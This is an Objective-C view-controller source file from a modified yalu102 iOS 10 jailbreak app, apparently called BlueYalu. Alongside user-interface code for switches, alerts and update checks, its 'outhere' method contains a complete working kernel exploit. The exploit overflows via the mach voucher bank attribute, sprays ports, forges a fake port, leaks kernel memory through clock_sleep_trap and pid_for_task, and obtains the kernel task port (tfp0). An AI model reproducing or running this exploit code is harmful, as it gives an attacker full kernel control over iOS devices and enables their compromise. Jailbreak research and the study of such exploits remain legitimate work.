//
//  ViewController.m
//  yalu102
//
//  Created by qwertyoruiop on 05/01/2017.
//  Copyright © 2017 kimjongcracks. All rights reserved.
//

#import "offsets.h"
#import "ViewController.h"
#import <mach-o/loader.h>
#import <sys/mman.h>
#import <pthread.h>
#undef __IPHONE_OS_VERSION_MIN_REQUIRED
#import <mach/mach.h>
#include <sys/utsname.h>
#include <spawn.h>
#import "vars.h"
#define UIColorFromRGB(rgbValue) \
[UIColor colorWithRed:((float)((rgbValue & 0xFF0000) >> 16))/255.0 \
green:((float)((rgbValue & 0x00FF00) >>  8))/255.0 \
blue:((float)((rgbValue & 0x0000FF) >>  0))/255.0 \
alpha:1.0]

extern char **environ;

extern uint64_t procoff;

typedef struct {
    mach_msg_header_t head;
    mach_msg_body_t msgh_body;
    mach_msg_ool_ports_descriptor_t desc[256];
    char pad[4096];
} sprz;

@interface ViewController ()
@property (retain, nonatomic) IBOutlet UIButton *ihs;
@property (retain, nonatomic) IBOutlet UIButton *btntt;
@property (retain, nonatomic) IBOutlet UIButton *btnt;
@property (retain, nonatomic) IBOutlet UIButton *scb;
@property (retain, nonatomic) IBOutlet UIButton *ucb;
@property (retain, nonatomic) IBOutlet UIButton *unjb;
@property (retain, nonatomic) IBOutlet UIButton *aboutb;
@property (retain, nonatomic) IBOutlet UIButton *cfu;
@property (retain, nonatomic) IBOutlet UIView *tmvv;
@property (retain, nonatomic) IBOutlet UIVisualEffectView *tmv;
@property (retain, nonatomic) IBOutlet UISwitch *vnodeswitch;
@property (retain, nonatomic) IBOutlet UIView *jbnv;
@property (retain, nonatomic) IBOutlet UIView *advancedsettings;
@property (retain, nonatomic) IBOutlet UISwitch *ssswitch;
@property (retain, nonatomic) IBOutlet UIVisualEffectView *jbingv;
@property (retain, nonatomic) IBOutlet UILabel *ago;
@property (retain, nonatomic) IBOutlet UIVisualEffectView *hooray;
@property (retain, nonatomic) IBOutlet UIImageView *b;
@property (retain, nonatomic) IBOutlet UIVisualEffectView *blurredJBView;
@property (retain, nonatomic) IBOutlet UIView *drag;
@property (retain, nonatomic) IBOutlet UILabel *cyLabel;
@property (retain, nonatomic) IBOutlet UIButton *nbxd;
@property (retain, nonatomic) IBOutlet UISlider *jb;
@property (retain, nonatomic) IBOutlet UIVisualEffectView *ve;
@property (retain, nonatomic) IBOutlet UILabel *ktxt;
@property (retain, nonatomic) IBOutlet UIWebView *updatewv;
@property (retain, nonatomic) IBOutlet UILabel *stjb;
@property (retain, nonatomic) IBOutlet UIButton *advancedbtn;
@property (retain, nonatomic) IBOutlet UISwitch *substrateswitch;
@property (retain, nonatomic) IBOutlet UIView *uv;
@property (retain, nonatomic) IBOutlet UIView *welcome;
@property (retain, nonatomic) IBOutlet UIButton *continueBtn;
@property (retain, nonatomic) IBOutlet UIWebView *critical_update_checker;
@property (retain, nonatomic) IBOutlet UISwitch *cySwitch;

@end

@implementation ViewController
// code.
NSInteger goawayplzzzz;
NSInteger esesheughtch;
NSInteger SubstrateVar;
NSInteger vvvnode;
NSInteger NoSubstrateDetect;
NSInteger CydiaGet;
NSInteger thingtothingthething;
NSInteger viewChk;
int nsJB;
int cs;

-(IBAction)upd8:(id)sender {
    NSURL *targetURL2 = [NSURL URLWithString:@"http://loftynine7.github.io/5dot1BlueYaluUpdateCheck.html"];
    NSURLRequest *request2 = [NSURLRequest requestWithURL:targetURL2];
    [_updatewv loadRequest:request2];
    [_uv setAlpha:0.0f];
    [UIView animateWithDuration:0.5f animations:^{
        [_uv setAlpha:1.0f];
        [[UIApplication sharedApplication] setStatusBarStyle:UIStatusBarStyleDefault];
        [_uv setHidden:(NO)];
    } completion:nil];
    viewChk = 0;
}
-(IBAction)upd7:(id)sender {
    [UIView animateWithDuration:0.5f animations:^{
        
        [[UIApplication sharedApplication] setStatusBarStyle:UIStatusBarStyleLightContent];
        [_uv setAlpha:0.0f];
        
    } completion:nil];
    
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 0.6 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
        [_uv setHidden:(YES)];
    });
    viewChk = 1;
}

-(IBAction)advanceds:(id)sender {
    [_advancedsettings setAlpha:0.0f];
    [UIView animateWithDuration:0.5f animations:^{
        _tmvv.layer.cornerRadius = 8;
        [_advancedsettings setAlpha:0.8f];
        _tmvv.transform = CGAffineTransformMakeScale(0.9, 0.9);
        [[UIApplication sharedApplication] setStatusBarStyle:UIStatusBarStyleDefault];
        [_advancedsettings setHidden:(NO)];
    } completion:nil];
    viewChk = 0;
}

-(IBAction)advancedc:(id)sender {
    [UIView animateWithDuration:0.5f animations:^{
        if (cs == 1) {
        }
        else {
        _tmvv.layer.cornerRadius = 0;
        _tmvv.transform = CGAffineTransformMakeScale(1, 1);
        }
        [[UIApplication sharedApplication] setStatusBarStyle:UIStatusBarStyleLightContent];
        [_advancedsettings setAlpha:0.0f];
    } completion:nil];
    
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 0.6 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
        [_advancedsettings setHidden:(YES)];
    });
    viewChk = 1;
    cs = 0;
}

-(IBAction)setCydia:(id)sender {
    if ([_cySwitch isOn]) {
        CydiaGet = 1;
        NSString *filePath = @"/Applications/Cydia.app";
        if ([[NSFileManager defaultManager] fileExistsAtPath:filePath])
        {
            UIAlertController * alert = [UIAlertController
                                         alertControllerWithTitle:@"Warning"
                                         message:@"This will delete MOST if not ALL of the tweaks currently installed on your device. Would you like to continue anyway?"
                                         preferredStyle:UIAlertControllerStyleAlert];
            
            
            
            UIAlertAction* yesButton = [UIAlertAction
                                        actionWithTitle:@"Continue"
                                        style:UIAlertActionStyleDestructive
                                        handler:^(UIAlertAction * action) {
                                            
                                        }];
            
            UIAlertAction* noButton = [UIAlertAction
                                       actionWithTitle:@"Cancel"
                                       style:UIAlertActionStyleDefault
                                       handler:^(UIAlertAction * action) {
                                           [_cySwitch setOn:NO animated:YES];
                                           CydiaGet = 0;
                                       }];
            
            [alert addAction:yesButton];
            [alert addAction:noButton];
            [alert setPreferredAction:noButton];
            
            [self presentViewController:alert animated:YES completion:nil];
        }
        else {
            
        }
        
    }
    else {
        CydiaGet = 0;
    }
}
-(void)dismissv {
    [_welcome setAlpha:1.0f];
    [UIView animateWithDuration:1.1f animations:^{
        [[UIApplication sharedApplication] setStatusBarStyle:UIStatusBarStyleLightContent];
        [_welcome setAlpha:0.0f];
    } completion:nil];
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 1.1 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
        [_welcome setHidden:(YES)];
    });
    viewChk = 1;
}
-(IBAction)setval:(id)sender {
    [[NSUserDefaults standardUserDefaults] setObject:@"yes" forKey:@"wsd"];
    [[NSUserDefaults standardUserDefaults] synchronize];
    [self dismissv];
}
-(IBAction)setSubstrate:(id)sender {
    if ([_substrateswitch isOn]) {
        SubstrateVar = 1;
        [[NSUserDefaults standardUserDefaults] setBool:self.substrateswitch.on forKey:@"switch1"];
        [[NSUserDefaults standardUserDefaults] synchronize];
    }
    else {
        SubstrateVar = 0;
    }
    NSString *value1 = @"ON";
    NSUserDefaults *userPreferences1 = [NSUserDefaults standardUserDefaults];
    if(!_substrateswitch.on){
        value1 = @"OFF";
        [userPreferences1 setObject:value1 forKey:@"stateOfSwitch1"];
    }
    [userPreferences1 setObject:value1 forKey:@"stateOfSwitch1"];
}



-(IBAction)ssh:(id)sender {
    
    if ([_ssswitch isOn]) {
    }
    else {
        esesheughtch = 0;
    }
    
    [[NSUserDefaults standardUserDefaults] setBool:self.ssswitch.on forKey:@"switch7"];
    [[NSUserDefaults standardUserDefaults] synchronize];
}

-(IBAction)vnode:(id)sender {
    if ([_vnodeswitch isOn]) {
        vvvnode = 1;
    }
    else {
        vvvnode = 0;
    }
    [[NSUserDefaults standardUserDefaults] setBool:self.vnodeswitch.on forKey:@"switch6"];
    [[NSUserDefaults standardUserDefaults] synchronize];
}


// why 6 and 7?
// BECAUSE I CANT BE BOTHERED REMEMBERING NUMBERS.

-(IBAction)rb:(id)sender {
    UIApplication *application = [UIApplication sharedApplication];
    NSURL *URL = [NSURL URLWithString:@"http://loftynine7.weebly.com/blueboot"];
    [application openURL:URL options:@{} completionHandler:^(BOOL success) {
        if (success) {
            NSLog(@"Rebooting...");
        }
    }];
}

-(IBAction)helper:(id)sender {
    UIApplication *application = [UIApplication sharedApplication];
    NSURL *URL = [NSURL URLWithString:@"http://loftynine7.weebly.com/blueyaluhelperinstaller"];
    [application openURL:URL options:@{} completionHandler:^(BOOL success) {
        if (success) {
            NSLog(@"Installing...");
        }
    }];
}

- (void)viewDidLoad {
    [super viewDidLoad];
    float ver = [[[UIDevice currentDevice] systemVersion] floatValue];
    if (ver <= 10.21) {
        [self continueLoad];
    }
    else {
        [_tmvv setHidden:YES];
        [_uv setHidden:YES];
        [_advancedsettings setHidden:YES];
        [_welcome setHidden:YES];
        
        UIAlertController * unsupported = [UIAlertController
                                           alertControllerWithTitle:@"iOS Version Unsupported"
                                           message:[NSString stringWithFormat:@"iOS %f is not supported by BlueYalu.", [[[UIDevice currentDevice] systemVersion] floatValue]]
                                           preferredStyle:UIAlertControllerStyleAlert];
        
        UIAlertAction* close = [UIAlertAction
                                actionWithTitle:@"Close"
                                style:UIAlertActionStyleDefault
                                handler:^(UIAlertAction * action) {
                                    assert(NO);
                                    exit(0);
                                }];
        
        [unsupported addAction:close];
        
        [self presentViewController:unsupported animated:YES completion:nil];
    }
}

-(void)continueLoad {
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(appDidBecomeActive:) name:UIApplicationDidBecomeActiveNotification object:nil];
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(appWillEnterForeground:) name:UIApplicationWillEnterForegroundNotification object:nil];
    
    goawayplzzzz = 0;
    [_welcome setHidden:YES];
    self.substrateswitch.on = [[NSUserDefaults standardUserDefaults] boolForKey:@"switch1"];
    self.vnodeswitch.on = [[NSUserDefaults standardUserDefaults] boolForKey:@"switch7"];
    self.ssswitch.on = [[NSUserDefaults standardUserDefaults] boolForKey:@"switch6"];
    [_advancedsettings setHidden:YES];
    [_hooray setHidden:(YES)];
    gesture = [[UIPanGestureRecognizer alloc]initWithTarget:self action:@selector(dodatnow)];
    
    [self.drag addGestureRecognizer:gesture];
    _drag.layer.cornerRadius = 5;
    _drag.clipsToBounds = YES;
    _ve.layer.cornerRadius = 50.0;
    _ve.clipsToBounds = YES;
    _jbingv.layer.cornerRadius = 50.0;
    _jbingv.clipsToBounds = YES;
    _hooray.layer.cornerRadius = 50.0;
    _hooray.clipsToBounds = YES;
    _advancedbtn.layer.cornerRadius = 15.0;
    _advancedbtn.clipsToBounds = YES;
    _blurredJBView.layer.cornerRadius = 18.0;
    _blurredJBView.clipsToBounds = YES;
    _ago.layer.borderWidth = 1.0f;
    _ago.layer.borderColor = [UIColor whiteColor].CGColor;
    _ago.layer.cornerRadius = 8.0;
    _ago.clipsToBounds = YES;
    [_jbingv setHidden:(YES)];
    [_ve setHidden:(NO)];
    NSURL *targetURL = [NSURL URLWithString:@"http://loftynine7.github.io/5dot1BlueYaluCriticalUpdateCheck.html"];
    NSURLRequest *request = [NSURLRequest requestWithURL:targetURL];
    [_critical_update_checker loadRequest:request];
    NSURL *targetURL1 = [NSURL URLWithString:@"http://loftynine7.github.io/5dot1BlueYaluUpdateCheck.html"];
    NSURLRequest *request1 = [NSURLRequest requestWithURL:targetURL1];
    [_updatewv loadRequest:request1];
    if([[NSUserDefaults standardUserDefaults] objectForKey:@"dateAgo"])
    {
        NSDate *twer = [[NSUserDefaults standardUserDefaults] objectForKey:@"dateAgo"];
        NSTimeInterval time = [[NSDate date] timeIntervalSinceDate:twer];
        int times = time/86400;
        self.ago.text = [NSString stringWithFormat:@"%d days since installation",times+1];
        if ([_ago.text isEqualToString:@"1 days since installation"]){
            self.ago.text = @"1 day since installation";
        }
        else{
            self.ago.text = [NSString stringWithFormat:@"%d days since installation",times+1];
        }
        
    }
    else
    {
        [[NSUserDefaults standardUserDefaults] setObject:[NSDate date] forKey:@"dateAgo"];
        [[NSUserDefaults standardUserDefaults] synchronize];
        
    }
    
    NSString* wsd = [[NSUserDefaults standardUserDefaults] stringForKey:@"wsd"];
    
    if ( [wsd isEqual: @"no"] )
    {
        [[UIApplication sharedApplication] setStatusBarStyle:UIStatusBarStyleDefault];
        [_welcome setHidden:(NO)];
        [[UIApplication sharedApplication] setStatusBarStyle:UIStatusBarStyleDefault];
        viewChk = 0;
        [[UIApplication sharedApplication] setStatusBarStyle:UIStatusBarStyleDefault];
    }
    
    else if ( [wsd isEqual: @"yes"]) {
        viewChk = 1;
    }
    
    else {
        [_welcome setHidden:(NO)];
        viewChk = 0;
        [UIView animateWithDuration:0.5f animations:^{
            
            [[UIApplication sharedApplication] setStatusBarStyle:UIStatusBarStyleDefault];
            
        } completion:nil];
    }
    
    
    
    
    
    
    /*
     [Lazy Town Theme Song]
     // because all the kool kidz have music in their code.
     
     https://www.youtube.com/watch?v=A3ULIbUkJkg
     
     Welcome to Lazy Town, a place where you wanna stay!
     You'll meet Robbie with his rotten plans and Sporticus saving the day!
     Stephanie is new in town, assume she and Ziggy are friends.
     With Pixel, Stingy and Trixie too, they're gonna have a blast together!
     Go go go get 'em Lazy Town, it's the start of a brand new day!
     Things are upside-down here in Lazy Town, adventure's just a moment away...
     */
    [_advancedbtn setEnabled:YES];
    [NSTimer scheduledTimerWithTimeInterval:1.0 target:self selector:@selector(nsd:) userInfo:nil repeats: YES];
    if ([_substrateswitch isOn]) {
        SubstrateVar = 1;
    }
    else {
        SubstrateVar = 0;
    }
    [_jb setValue:-4 animated:YES];
    [_jb setEnabled:YES];
    [_stjb setText:@"slide to jailbreak"];
    
    init_offsets();
    struct utsname u = { 0 };
    uname(&u);
    
    
    if (strstr(u.version, "MarijuanARM")) {
        [_jb setValue:1.1 animated:YES];
        [_jb setEnabled:NO];
        [_advancedbtn setEnabled:NO];
        [_advancedbtn setBackgroundColor:[UIColor grayColor]];
        [_hooray setHidden:(NO)];
        [_ve setHidden:(YES)];
        goawayplzzzz = 1;
    }
    
    if([_welcome isHidden] == NO) {
        [[UIApplication sharedApplication] setStatusBarStyle:UIStatusBarStyleDefault];
    }
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        [NSThread sleepForTimeInterval:0.8f];
        dispatch_async(dispatch_get_main_queue(), ^{
            if([_welcome isHidden] == NO) {
                [[UIApplication sharedApplication] setStatusBarStyle:UIStatusBarStyleDefault];
            }
            ;
        });
    });
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        [NSThread sleepForTimeInterval:1.0f];
        dispatch_async(dispatch_get_main_queue(), ^{
            if([_welcome isHidden] == NO) {
                [[UIApplication sharedApplication] setStatusBarStyle:UIStatusBarStyleDefault];
            }
            ;
        });
    });
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        [NSThread sleepForTimeInterval:2.5f];
        dispatch_async(dispatch_get_main_queue(), ^{
            if([_welcome isHidden] == NO) {
                [[UIApplication sharedApplication] setStatusBarStyle:UIStatusBarStyleDefault];
            }
            ;
        });
    });
}

typedef natural_t not_natural_t;

struct not_essers_ipc_object {
    not_natural_t io_bits;
    not_natural_t io_references;
    char    io_lock_data[1337];
    
};



#define IO_BITS_ACTIVE 0x80000000
#define	IKOT_TASK 2
#define IKOT_IOKIT_CONNECT 29
#define IKOT_CLOCK 25

char dt[128];

-(void)yolo
{
    if ([_substrateswitch isOn]) {
        SubstrateVar = 1;
        if(nsJB == 1) {
            SubstrateVar = 0;
        }
    }
    else {
        SubstrateVar = 0;
    }
    if ([_cySwitch isOn]) {
        CydiaGet = 1;
    }
    else {
        CydiaGet = 0;
    }
    if ([_vnodeswitch isOn]) {
        vvvnode = 1;
    }
    else {
        vvvnode = 0;
    }
    if ([_ssswitch isOn]) {
        UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"SSH Port" message:@"Please select the port you would like your device to listen on." preferredStyle:UIAlertControllerStyleAlert];
        UIAlertAction *p21 = [UIAlertAction actionWithTitle:@"Port 21" style:UIAlertActionStyleDefault handler:^(UIAlertAction * action){
            esesheughtch = 1;
            [self outhere];
        }];
        UIAlertAction *p22 = [UIAlertAction actionWithTitle:@"Port 22" style:UIAlertActionStyleDefault handler:^(UIAlertAction * action){
            esesheughtch = 2;
            [self outhere];
        }];
        [alert addAction:p21];
        [alert addAction:p22];
        [self presentViewController:alert animated:YES completion:nil];
    }
    else {
        esesheughtch = 0;
        [self outhere];
    }
    [[NSUserDefaults standardUserDefaults] setBool:self.substrateswitch.on forKey:@"s1"];
    [[NSUserDefaults standardUserDefaults] synchronize];
    [_ve setHidden:(YES)];
    [_jbingv setHidden:(NO)];
}

-(void)outhere {
    if (SubstrateVar == 1) {
        [_advancedbtn setEnabled:NO];
        [_advancedbtn setBackgroundColor:[UIColor grayColor]];
    }
    else {
        [_hooray setHidden:(NO)];
        goawayplzzzz = 1;
        [_ve setHidden:(YES)];
        [_stjb setHidden:YES];
        [_advancedbtn setEnabled:NO];
        [_advancedbtn setBackgroundColor:[UIColor grayColor]];
        UIAlertController * alert = [UIAlertController
                                     alertControllerWithTitle:@"Jailbroken"
                                     message:@"Your device has been successfully jailbroken, however MobileSubstrate has been disabled meaning tweaks will not function"
                                     preferredStyle:UIAlertControllerStyleAlert];
        
        [self presentViewController:alert animated:YES completion:nil];
    }
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 0.1 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
        
        /*
         
         we out here!
         
         */
        
        mach_port_t vch = 0;
        
        mach_voucher_attr_recipe_data_t *data = malloc(sizeof(mach_voucher_attr_recipe_data_t) + 0x10);
        data->content_size = 0;
        data->key=MACH_VOUCHER_ATTR_KEY_BANK;
        data->command=610;
        data->previous_voucher=MACH_PORT_NULL;
        
        kern_return_t lol = host_create_mach_voucher(mach_host_self(), data, sizeof(mach_voucher_attr_recipe_data_t), &vch);
        
        assert(lol==0 && vch!=0);
        
        
        unsigned char* odata = mmap(0, 0x8000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
        unsigned char* fdata = mmap(odata+0x4000, 0x4000, PROT_NONE, MAP_PRIVATE|MAP_ANON|MAP_FIXED, -1, 0);
        assert(fdata == odata + 0x4000);
        memset(odata, 0x42, 0x0);
        
        
        uint64_t rsz = 0x100; // alloc size;
        fdata -= rsz + 0x100; // overflow full chunk
        
        struct not_essers_ipc_object* fakeport = mmap(0, 0x8000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
        
        mlock(fakeport, 0x8000);
        
        fakeport->io_bits = IO_BITS_ACTIVE | IKOT_CLOCK;
        fakeport->io_lock_data[12] = 0x11;
        
        *(uint64_t*) (fdata + rsz) = (uint64_t) fakeport;
        
        
        mach_port_t* ports = calloc(800, sizeof(mach_port_t));
        
        for (int i = 0; i < 800; i++) {
            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
            mach_port_insert_right(mach_task_self(), ports[i], ports[i], MACH_MSG_TYPE_MAKE_SEND);
        }
        sprz msg1;
        
        memset(&msg1, 0, sizeof(sprz));
        sprz msg2;
        
        memset(&msg2, 0, sizeof(sprz));
        msg1.msgh_body.msgh_descriptor_count = 128;
        
        msg1.head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
        msg1.head.msgh_local_port = MACH_PORT_NULL;
        msg1.head.msgh_size = sizeof(msg1)-2048;
        
        mach_port_t* buffer = calloc(0x1000, sizeof(mach_port_t));
        for (int i = 0; i < 0x1000; i++) {
            buffer[i] = MACH_PORT_DEAD;
        }
        
        for (int i = 0; i < 256; i++) {
            msg1.desc[i].address = buffer;
            msg1.desc[i].count = 0x100/8;
            msg1.desc[i].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
            msg1.desc[i].disposition = 19;
        }
        
        pthread_yield_np();
        for (int i=1; i<300; i++) {
            msg1.head.msgh_remote_port = ports[i];
            kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
            assert(kret==0);
        }
        
        pthread_yield_np();
        for (int i=500; i<800; i++) {
            msg1.head.msgh_remote_port = ports[i];
            kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
            assert(kret==0);
        }
        
        pthread_yield_np();
        for (int i=300; i<500; i++) {
            msg1.head.msgh_remote_port = ports[i];
            if (i%4 == 0) {
                msg1.msgh_body.msgh_descriptor_count = 1;
            } else {
                msg1.msgh_body.msgh_descriptor_count = 256;
            }
            kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
            assert(kret==0);
        }
        
        pthread_yield_np();
        for (int i = 300; i<500; i+=4) {
            msg2.head.msgh_local_port = ports[i];
            kern_return_t kret = mach_msg(&msg2.head, MACH_RCV_MSG, 0, sizeof(msg1), ports[i], 0, 0);
            if(!(i < 380))
                ports[i] = 0;
            assert(kret==0);
        }
        for (int i = 300; i<380; i+=4) {
            msg1.head.msgh_remote_port = ports[i];
            msg1.msgh_body.msgh_descriptor_count = 1;
            kern_return_t kret = mach_msg(&msg1.head, MACH_SEND_MSG, msg1.head.msgh_size, 0, 0, 0, 0);
            assert(kret==0);
        }
        
        mach_voucher_extract_attr_recipe_trap(vch, MACH_VOUCHER_ATTR_KEY_BANK, fdata, &rsz);
        mach_port_t foundport = 0;
        for (int i=1; i<500; i++) {
            if (ports[i]) {
                msg1.head.msgh_local_port = ports[i];
                pthread_yield_np();
                kern_return_t kret = mach_msg(&msg1, MACH_RCV_MSG, 0, sizeof(msg1), ports[i], 0, 0);
                assert(kret==0);
                for (int k = 0; k < msg1.msgh_body.msgh_descriptor_count; k++) {
                    mach_port_t* ptz = msg1.desc[k].address;
                    for (int z = 0; z < 0x100/8; z++) {
                        if (ptz[z] != MACH_PORT_DEAD) {
                            if (ptz[z]) {
                                foundport = ptz[z];
                                goto foundp;
                            }
                            
                        }
                    }
                }
                mach_msg_destroy(&msg1.head);
                mach_port_deallocate(mach_task_self(), ports[i]);
                ports[i] = 0;
            }
        }
        
    foundp:
        NSLog(@"found corruption %x", foundport);
        
        uint64_t textbase = 0xfffffff007004000;
        
        for (int i = 0; i < 0x300; i++) {
            for (int k = 0; k < 0x40000; k+=8) {
                *(uint64_t*)(((uint64_t)fakeport) + 0x68) = textbase + i*0x100000 + 0x500000 + k;
                *(uint64_t*)(((uint64_t)fakeport) + 0xa0) = 0xff;
                
                kern_return_t kret = clock_sleep_trap(foundport, 0, 0, 0, 0);
                
                if (kret != KERN_FAILURE) {
                    goto gotclock;
                }
            }
        }
        
    gotclock:;
        uint64_t leaked_ptr =  *(uint64_t*)(((uint64_t)fakeport) + 0x68);
        
        leaked_ptr &= ~0x3FFF;
        
        fakeport->io_bits = IKOT_TASK|IO_BITS_ACTIVE;
        fakeport->io_references = 0xff;
        char* faketask = ((char*)fakeport) + 0x1000;
        
        *(uint64_t*)(((uint64_t)fakeport) + 0x68) = faketask;
        *(uint64_t*)(((uint64_t)fakeport) + 0xa0) = 0xff;
        *(uint64_t*) (faketask + 0x10) = 0xee;
        
        while (1) {
            int32_t leaked = 0;
            *(uint64_t*) (faketask + procoff) = leaked_ptr - 0x10;
            pid_for_task(foundport, &leaked);
            if (leaked == MH_MAGIC_64) {
                NSLog(@"found kernel text at %llx", leaked_ptr);
                break;
            }
            leaked_ptr -= 0x4000;
        }
        
        uint64_t kernel_base = leaked_ptr;
        
        uint64_t allproc = allproc_offset + kernel_base;
        
        uint64_t proc_ = allproc;
        
        uint64_t myproc = 0;
        uint64_t kernproc = 0;
        
        while (proc_) {
            uint64_t proc = 0;
            
            *(uint64_t*) (faketask + procoff) = proc_ - 0x10;
            pid_for_task(foundport, (int32_t*)&proc);
            *(uint64_t*) (faketask + procoff) = 4 + proc_ - 0x10;
            pid_for_task(foundport, (int32_t*)(((uint64_t)(&proc)) + 4));
            
            int pd = 0;
            *(uint64_t*) (faketask + procoff) = proc;
            pid_for_task(foundport, &pd);
            
            if (pd == getpid()) {
                myproc = proc;
            } else if (pd == 0){
                kernproc = proc;
            }
            proc_ = proc;
        }
        
        
        uint64_t kern_task = 0;
        *(uint64_t*) (faketask + procoff) = kernproc - 0x10 + 0x18;
        pid_for_task(foundport, (int32_t*)&kern_task);
        *(uint64_t*) (faketask + procoff) = 4 + kernproc - 0x10 + 0x18;
        pid_for_task(foundport, (int32_t*)(((uint64_t)(&kern_task)) + 4));
        
        uint64_t itk_kern_sself = 0;
        *(uint64_t*) (faketask + procoff) = kern_task - 0x10 + 0xe8;
        pid_for_task(foundport, (int32_t*)&itk_kern_sself);
        *(uint64_t*) (faketask + procoff) = 4 + kern_task - 0x10 + 0xe8;
        pid_for_task(foundport, (int32_t*)(((uint64_t)(&itk_kern_sself)) + 4));
        
        char* faketaskport = malloc(0x1000);
        char* ktaskdump = malloc(0x1000);
        
        for (int i = 0; i < 0x1000/4; i++) {
            *(uint64_t*) (faketask + procoff) = itk_kern_sself - 0x10 + i*4;
            pid_for_task(foundport, (int32_t*)(&faketaskport[i*4]));
        }
        for (int i = 0; i < 0x1000/4; i++) {
            *(uint64_t*) (faketask + procoff) = kern_task - 0x10 + i*4;
            pid_for_task(foundport, (int32_t*)(&ktaskdump[i*4]));
        }
        
        memcpy(fakeport, faketaskport, 0x1000);
        memcpy(faketask, ktaskdump, 0x1000);
        
        mach_port_t pt = 0;
        
        *(uint64_t*)(((uint64_t)fakeport) + 0x68) = faketask;
        *(uint64_t*)(((uint64_t)fakeport) + 0xa0) = 0xff;
        
        *(uint64_t*)(((uint64_t)faketask) + 0x2b8) = itk_kern_sself;
        
        task_get_special_port(foundport, 4, &pt); // get tfp0
        NSLog(@"got tfp0 -> %x", pt);
        fakeport->io_bits = 0;
        
        extern uint64_t slide;
        slide = kernel_base - 0xFFFFFFF007004000;
        
        void exploit(void*, mach_port_t, uint64_t, uint64_t);
        exploit(NULL, pt, kernel_base, allproc_offset);
        [_jb setValue:1.1 animated:YES];
        [_jb setEnabled:NO];
        [_hooray setHidden:(NO)];
        [_ve setHidden:(YES)];
        [_advancedbtn setEnabled:NO];
        [_advancedbtn setBackgroundColor:[UIColor grayColor]];
        goawayplzzzz = 1;
    });
}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

- (void)appDidBecomeActive:(NSNotification *)notification {
}

- (void)appWillEnterForeground:(NSNotification *)notification {
}

-(void)urlscheme {
    NSString *urlscheme = [[NSUserDefaults standardUserDefaults] objectForKey:@"urlscheme"];
    NSString *nullscheme = @"NULL";
    [[NSUserDefaults standardUserDefaults] setObject:nullscheme forKey:@"urlscheme"];
    [[NSUserDefaults standardUserDefaults] synchronize];
    if([urlscheme isEqual: @"CANCEL"]) {
    }
    
    else {
        if([urlscheme isEqual: @"blueyalu://"]){    }
        else if([urlscheme isEqual: @"blueyalu://api/nsJB"]){
            UIAlertController * alert = [UIAlertController
                                         alertControllerWithTitle:@"Confirmation"
                                         message:@"Are you sure you want to jailbreak using your current settings, but without substrate enabled?"
                                         preferredStyle:UIAlertControllerStyleAlert];
            UIAlertAction* yesButton = [UIAlertAction
                                        actionWithTitle:@"Yes"
                                        style:UIAlertActionStyleDestructive
                                        handler:^(UIAlertAction * action) {
                                            nsJB = 1;
                                            [_ve setHidden:YES];
                                            [_jbingv setHidden:YES];
                                            [_hooray setHidden:YES];
                                            [self yolo];
                                        }];
            UIAlertAction* noButton = [UIAlertAction
                                       actionWithTitle:@"No"
                                       style:UIAlertActionStyleDefault
                                       handler:^(UIAlertAction * action) {
                                       }];
            [alert addAction:yesButton];
            [alert addAction:noButton];
            [self presentViewController:alert animated:YES completion:nil];
        }
        
        else if([urlscheme isEqual: @"blueyalu://api/jb"]){
            UIAlertController * alert = [UIAlertController
                                         alertControllerWithTitle:@"Confirmation"
                                         message:@"Are you sure you want to jailbreak your device with your current settings?"
                                         preferredStyle:UIAlertControllerStyleAlert];
            UIAlertAction* yesButton = [UIAlertAction
                                        actionWithTitle:@"Yes"
                                        style:UIAlertActionStyleDestructive
                                        handler:^(UIAlertAction * action) {
                                            nsJB = 0;
                                            [_ve setHidden:YES];
                                            [_jbingv setHidden:NO];
                                            [self yolo];
                                        }];
            UIAlertAction* noButton = [UIAlertAction
                                       actionWithTitle:@"No"
                                       style:UIAlertActionStyleDefault
                                       handler:^(UIAlertAction * action) {
                                       }];
            [alert addAction:yesButton];
            [alert addAction:noButton];
            [self presentViewController:alert animated:YES completion:nil];
        }
        
        else if([urlscheme isEqual: @"blueyalu://api/"]){
            UIAlertController * alert = [UIAlertController
                                         alertControllerWithTitle:@"API"
                                         message:@"You can jailbreak / re-jailbreak your device with your current settings by going to blueyalu://api/jb and you can jailbreak your device with your current settings but without substrate enabled by going to blueyalu://api/nsJB."
                                         preferredStyle:UIAlertControllerStyleAlert];
            UIAlertAction* close = [UIAlertAction
                                        actionWithTitle:@"Close"
                                        style:UIAlertActionStyleDestructive
                                        handler:^(UIAlertAction * action) {
                                        }];
            [alert addAction:close];
            [self presentViewController:alert animated:YES completion:nil];
        }

        else if([urlscheme isEqual: @"blueyalu://api"]){
            UIAlertController * alert = [UIAlertController
                                         alertControllerWithTitle:@"API"
